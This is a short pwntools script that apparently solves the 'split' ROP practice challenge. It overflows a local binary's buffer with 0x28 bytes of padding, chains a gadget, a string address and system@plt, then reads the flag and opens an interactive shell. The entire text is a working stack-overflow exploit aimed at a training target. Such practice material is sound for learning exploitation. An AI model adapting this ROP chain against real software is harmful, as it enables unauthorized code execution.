#/usr/bin/env python

from pwn import *

context.binary = './split'
context.log_level = 'debug'

io = process('./split')
elf = ELF('./split')

io.recv()
payload = 'A'*0x28
payload += p64(0x0400883)
payload += p64(0x601060)
payload += p64(elf.plt['system'])

#gdb.attach(io)
io.sendline(payload)

flag = io.recvline()
log.info('flag:'+flag)

io.interactive()
